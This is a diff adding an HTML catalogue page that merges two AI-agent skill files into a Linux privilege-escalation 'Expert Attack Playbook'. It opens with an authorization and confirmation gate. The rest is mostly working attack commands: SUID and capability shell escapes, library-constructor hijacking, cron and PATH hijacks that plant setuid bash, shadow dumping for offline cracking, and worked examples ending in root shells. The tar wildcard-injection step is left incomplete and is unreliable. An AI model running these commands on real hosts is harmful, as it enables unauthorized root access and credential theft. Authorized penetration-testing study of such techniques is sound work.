@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>linux-privilege-escalation</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">linux-privilege-escalation</a> / linux-privilege-escalation</p><h1>linux-privilege-escalation</h1><p class="meta">combined</p><p>The two copies overlap on the core Linux privesc workflow (enumerate, SUID/SGID, capabilities, cron, kernel), but each has material content the other lacks. The yaklang copy is a detailed, command-level playbook with specific GTFOBins commands, capability exploitation examples, shared-library hijacking, and routing to companion skills. The sickn33 copy is a higher-level skill wrapper that mandates a confirmation gate, legal/ethical guardrails, operational boundaries, and points to a separate detailed guide, plus it includes worked examples. Crowning one would hide either the concrete exploitation steps or the mandatory authorization/safety constraints, so they should be combined.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/yaklang/hack-skills">yaklang/hack-skills</a></td><td><code>skills/linux-privilege-escalation/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/linux-privilege-escalation/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/yaklang/hack-skills">yaklang/hack-skills</a></td><td><code>skills/linux-privilege-escalation/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/linux-privilege-escalation/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/linux-privilege-escalation/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-bundle-aas-security-engineer/skills/linux-privilege-escalation/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/linux-privilege-escalation/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: linux-privilege-escalation
+description: &gt;-
+  Linux privilege escalation playbook. Use when you have low-privilege shell access and need to escalate to root via SUID/SGID binaries, capabilities, cron abuse, kernel exploits, misconfigurations, or credential harvesting on Linux systems.
+risk: offensive
+source: community
+---
+
+# SKILL: Linux Privilege Escalation — Expert Attack Playbook
+
+&gt; **AI LOAD INSTRUCTION**: Expert Linux privesc techniques. Covers enumeration, SUID/SGID, capabilities, cron abuse, kernel exploits, NFS, writable passwd/shadow, LD_PRELOAD, Docker group, and library hijacking. Base models miss subtle escalation paths via capabilities and combined misconfigurations.
+
+## 0. AUTHORIZATION AND SAFETY GATE
+
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+&gt; Misuse of this tool is illegal and strictly prohibited.
+
+&gt; **Mandatory confirmation gate**
+&gt; Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+&gt; 1. Ask the user to state the exact target URL, IP, account, or resource.
+&gt; 2. Ask the user to confirm written authorization and the permitted scope.
+&gt; 3. Show the exact command(s) and explain their expected effect.
+&gt; 4. Wait for explicit confirmation in the current conversation.
+&gt;
+&gt; Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
+### Operational Boundaries
+- Verify kernel exploits in test environment before production use
+- Failed kernel exploits may crash the system
+- Document all changes made during privilege escalation
+- Maintain access persistence only as authorized
+
+### Technical Limitations
+- Modern kernels may have exploit mitigations (ASLR, SMEP, SMAP)
+- AppArmor/SELinux may restrict exploitation techniques
+- Container environments limit kernel-level exploits
+- Hardened systems may have restricted sudo configurations
+
+### Legal and Ethical Requirements
+- Written authorization required before testing
+- Stay within defined scope boundaries
+- Report critical findings immediately
+- Do not access data beyond scope requirements
+
+## 1. RELATED ROUTING
+
+Before going deep, consider loading:
+
+- [container-escape-techniques](../container-escape-techniques/SKILL.md) when the target is a container and you need to escape to host
+- [linux-security-bypass](../linux-security-bypass/SKILL.md) when facing restricted shells, AppArmor, SELinux, or seccomp
+- [linux-lateral-movement](../linux-lateral-movement/SKILL.md) after obtaining root for pivoting to adjacent hosts
+- [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md) when the host is a Kubernetes node
+
+### Advanced Reference
+
+Also load [SUID_CAPABILITIES_TRICKS.md](./SUID_CAPABILITIES_TRICKS.md) when you need:
+- Top 30 SUID binaries with exact exploitation commands (GTFOBins)
+- Capability-specific exploitation for each dangerous cap
+- Custom SUID binary exploitation methodology
+
+Also load [KERNEL_EXPLOITS_CHECKLIST.md](./KERNEL_EXPLOITS_CHECKLIST.md) when you need:
+- Kernel version → exploit mapping table (DirtyPipe, DirtyCow, OverlayFS, etc.)
+- Exploit compilation tips and cross-compilation notes
+- Kernel exploit stability assessment
+
+## 2. ENUMERATION CHECKLIST
+
+Run these immediately after landing a shell:
+
+### System Info
+
+```bash
+uname -a                        # Kernel version
+cat /etc/os-release             # Distro and version
+cat /proc/version               # Kernel compile info
+hostname &amp;&amp; id &amp;&amp; whoami        # Current context
+```
+
+### Sudo &amp; SUID/SGID
+
+```bash
+sudo -l                         # What can we run as root?
+find / -perm -4000 -type f 2&gt;/dev/null   # SUID binaries
+find / -perm -2000 -type f 2&gt;/dev/null   # SGID binaries
+getcap -r / 2&gt;/dev/null         # Files with capabilities
+```
+
+### Cron &amp; Timers
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+systemctl list-timers --all     # systemd timers
+```
+
+### Writable Files &amp; Dirs
+
+```bash
+find / -writable -type f 2&gt;/dev/null | grep -v proc
+ls -la /etc/passwd /etc/shadow  # Check permissions
+find / -perm -o+w -type d 2&gt;/dev/null   # World-writable dirs
+```
+
+### Network &amp; Services
+
+```bash
+ss -tlnp                        # Listening services
+cat /proc/net/tcp               # Raw TCP connections
+ps aux                          # Running processes
+env                             # Environment variables (credentials?)
+```
+
+### Credential Locations
+
+```bash
+cat ~/.bash_history
+cat ~/.mysql_history
+find / -name &quot;*.conf&quot; -o -name &quot;*.cfg&quot; -o -name &quot;*.ini&quot; 2&gt;/dev/null | head -30
+find / -name &quot;id_rsa&quot; -o -name &quot;*.pem&quot; -o -name &quot;*.key&quot; 2&gt;/dev/null
+```
+
+## 3. SUID/SGID EXPLOITATION
+
+### GTFOBins Methodology
+
+1. Find SUID binaries: `find / -perm -4000 -type f 2&gt;/dev/null`
+2. Cross-reference each with [GTFOBins](https://gtfobins.github.io/)
+3. Use the &quot;SUID&quot; section specifically — not all binary abuse works with SUID
+
+### Quick-Win SUID Escalations
+
+| Binary | Command |
+|---|---|
+| `bash` | `bash -p` |
+| `find` | `find . -exec /bin/sh -p \; -quit` |
+| `vim` | `vim -c &#x27;:!/bin/sh&#x27;` |
+| `python` | `python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)&#x27;` |
+| `env` | `env /bin/sh -p` |
+| `nmap` (old) | `nmap --interactive` → `!sh` |
+| `awk` | `awk &#x27;BEGIN {system(&quot;/bin/sh -p&quot;)}&#x27;` |
+| `less` | `less /etc/passwd` → `!/bin/sh` |
+| `cp` | Copy `/etc/passwd`, add root user, copy back |
+
+### Shared Library Hijacking (SUID Binary)
+
+```bash
+ldd /usr/local/bin/suid_binary                    # Check loaded libraries
+strace /usr/local/bin/suid_binary 2&gt;&amp;1 | grep -i &quot;open.*\.so&quot;  # Find load paths
+
+# If it loads from a writable directory — inject constructor:
+gcc -shared -fPIC -o /writable/path/libevil.so evil.c
+# evil.c: __attribute__((constructor)) → setuid(0); system(&quot;/bin/bash -p&quot;)
+```
+
+## 4. CAPABILITIES ABUSE
+
+| Capability | Risk | Exploitation |
+|---|---|---|
+| `cap_setuid` | **Critical** | `python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;` |
+| `cap_dac_override` | **Critical** | Read/write any file regardless of permissions |
+| `cap_dac_read_search` | **High** | Read any file — dump `/etc/shadow` |
+| `cap_sys_admin` | **Critical** | Mount filesystems, BPF, namespace manipulation |
+| `cap_sys_ptrace` | **High** | Inject into root processes via ptrace |
+| `cap_net_raw` | **Medium** | Sniff traffic, ARP spoofing |
+| `cap_net_bind_service` | **Low** | Bind to privileged ports (&lt;1024) |
+| `cap_fowner` | **High** | Change ownership of any file |
+
+```bash
+# Find binaries with capabilities
+getcap -r / 2&gt;/dev/null
+
+# Example: python3 with cap_setuid
+# /usr/bin/python3 = cap_setuid+ep
+python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;
+```
+
+## 5. CRON / TIMER ABUSE
+
+### Writable Cron Scripts
+
+```bash
+# Find cron jobs running as root
+cat /etc/crontab | grep root
+ls -la /etc/cron.d/
+
+# If a root-owned cron runs a script writable by current user:
+echo &#x27;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash&#x27; &gt;&gt; /writable/script.sh
+# Wait for cron → /tmp/bash -p
+```
+
+### PATH Hijacking in Cron
+
+```bash
+# If crontab has: PATH=/home/user:/usr/local/bin:/usr/bin
+# And runs: * * * * * root backup.sh (without full path)
+# Create /home/user/backup.sh:
+echo &#x27;#!/bin/bash&#x27; &gt; /home/user/backup.sh
+echo &#x27;cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash&#x27; &gt;&gt; /home/user/backup.sh
+chmod +x /home/user/backup.sh
+```
+
+### Wildcard Injection (tar)
+
+```bash
+# If cron runs: tar czf /backup/archive.tar.gz *
+# In the target directory, create:
+echo &#x27;cp /bin/bash /tmp/bash &amp;&amp; chmod +s /tmp/bash&#x27; &gt; /tmp/evil.sh
+```
+
+## 6. WORKED EXAMPLES
+
+### Example 1: Sudo to Root via find
+
+**Scenario**: User has sudo rights for find command
+
+```bash
+$ sudo -l
+User user may run the following commands:
+    (root) NOPASSWD: /usr/bin/find
+
+$ sudo find . -exec /bin/bash \; -quit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+### Example 2: SUID base64 for Shadow Access
+
+**Scenario**: base64 binary has SUID bit set
+
+```bash
+$ find / -perm -u=s -type f 2&gt;/dev/null | grep base64
+/usr/bin/base64
+
+$ base64 /etc/shadow | base64 -d
+root:$6$xyz...:18000:0:99999:7:::
+
+# Crack offline with john
+$ john --wordlist=rockyou.txt shadow.txt
+```
+
+### Example 3: Cron Job Script Hijacking
+
+**Scenario**: Root cron job executes writable script
+
+```bash
+$ cat /etc/crontab
+* * * * * root /opt/scripts/backup.sh
+
+$ ls -la /opt/scripts/backup.sh
+-rwxrwxrwx 1 root root 50 /opt/scripts/backup.sh
+
+$ echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt;&gt; /opt/scripts/backup.sh
+
+# Wait 1 minute
+$ /tmp/bash -p
+# id
+uid=1000(user) gid=1000(user) euid=0(root)
+```
+
+## 7. DETAILED GUIDE
+
+Read [the detailed guide](references/detailed-guide.md) before executing this skill. It retains the complete procedure and reference material. Treat its safety, prerequisites, and validation requirements as mandatory. For focused work, load the relevant sections; for end-to-end work, read the guide completely.</pre>
+</body>
+</html>
